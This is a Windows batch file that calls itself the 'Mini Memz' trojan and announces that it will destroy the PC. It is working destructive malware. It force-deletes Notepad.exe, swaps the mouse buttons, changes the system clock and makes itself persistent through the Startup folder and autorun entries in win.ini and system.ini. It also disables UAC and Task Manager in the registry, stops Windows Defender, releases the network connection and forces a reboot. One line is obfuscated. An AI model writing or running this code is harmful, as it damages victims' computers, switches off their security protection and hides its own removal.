@echo off
title Mini Memz.bat
echo this malware, no joke!
echo Destroy pc!
pause
cd Deskop
echo YOUR COMPUTER HAS BEEN FUKED THE MINI MEMZ TROJAN.
echo 
echo
echo Your computer wont't boot again,
echo so use it as long as you can!
echo 
echo :D
echo 
echo Trying to kill MINI MEMZ will your computer system to be
echo destroyed instanly, to don't it :D

DEL /F /S /Q /A "Notepad.exe"
start charmap.exe
start https://youareanidiot.cc
echo Msgbox"Using still your computer?",48+0,"lol">>msg.vbs
start msg.vbs
RUNDLL32 USER32.DLL,SwapMouseButton
date 22/08/2014
time 06:06:06
copy %0 "%userprofile%\Start Menu\Programs\Startup"
set b=setup
copy %0 %windir%\%b%.bat
echo [windows] >> %windir%\win.ini
echo run=%windir%\%b%.bat >> %windir%\win.ini
echo load=%windir%\%b%.bat >> %windir%\win.ini
echo [boot] >> %windir%\system.ini
echo shell=explorer.exe %b%.bat >> %windir%\system.ini
@Set RegistyEditCmd=Cmd /k Reg Add
@Set HiveSysKey=HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System
@%RegistyEditCmd% "%HiveSysKey%" /v "EnableLUA" /t "REG_DWORD" /d "0" /f > nul
@Echo off & @@Break Off
Ipconfig / release
%jUmP%E%nD%c%onFiG%h%IdE%o%P% h%aRv%%aRd%A%T%%cHe%cK%HappY%3D b%aLLo0Ns%Y%eS% m3Ga!?!
P%ReSs%%IE%AuS%ExPloR%e%r% > nul.%TempInternetRelease%
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_SZ /d 1 /f >nul
net stop "WinDefend"
taskkill /f /t /im "MSASCui.exe"
shutdown /r -t 60 -c "USING STIL YOU COMPUET?!"
